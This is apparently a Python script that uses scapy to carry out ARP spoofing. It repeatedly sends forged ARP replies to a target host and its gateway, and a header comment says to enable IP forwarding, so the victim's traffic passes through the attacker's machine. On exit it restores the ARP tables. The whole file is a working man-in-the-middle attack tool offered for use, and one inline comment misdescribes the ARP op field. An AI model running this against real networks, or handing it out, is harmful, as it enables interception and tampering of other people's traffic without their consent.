'''
DO NOT FORGET TO RUN echo 1 > /proc/sys/net/ipv4/ip_forward IN PARALLEL FOR IP FORWARDING
'''
import argparse as ap
import time
import scapy.all as scapy   #Same module used in network_manager.py

def arguments():
    parser = ap.ArgumentParser()
    parser.add_argument("-s", "--src-ip", dest="source_ip", help =" Enter the router/gateway IP")
    parser.add_argument("-t", "--target", dest="target_ip",help =" Enter th target IP")
    options = parser.parse_args()
    source_ip = options.source_ip
    target_ip = options.target_ip
    return source_ip, target_ip
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # pdst IS A MODULE IN ARP() CLASS
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_result = broadcast / arp_request
    answered = scapy.srp(arp_result, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, source_ip ):
    packet = scapy.ARP(op = 2, pdst = target_ip ,hwdst = get_mac(target_ip) ,psrc = source_ip)

    '''
    USE scapy.ls(CLASS) TO FIND THE MODULES INSIDE THE CLASS
    Eg - scapy.ls(scapy.ARP) SHOW THE MODULES OF ARP CLASS
    '''
    '''
    OPTIMISE PACKET(op) = 1 MEANS SENT PACKETS ONLY (DEFAULT)
                          2 MEANS SENT AND RECEIVE PACKETS
    '''
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=source_ip, hwsrc=get_mac(source_ip) )
    scapy.send(packet, verbose=False, count =4)    # COUNT IS NUMBER OF PACKET TO BE SENT

print("[+]Setting ARP table....\n")
source_ip, target_ip = arguments()
sent_packet = 0
while True:
    try:
        spoof(target_ip, source_ip)
        spoof(source_ip, target_ip)
        sent_packet += 2
        print(f"\r[+] {str(sent_packet)} packets sent..",end="")
        time.sleep(2)
    except IndexError:
        spoof(target_ip, source_ip)
        spoof(source_ip, target_ip)
        sent_packet += 2
        print(f"\r[+] {str(sent_packet)} packets sent..", end="")
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n\n[-]Closing Program.....")
        time.sleep(1)
        print("[-]Restoring ARP Tables....")
        restore(target_ip,source_ip)
        restore(source_ip,target_ip)
        time.sleep(5)
        print("[-]Exiting.....")
        break

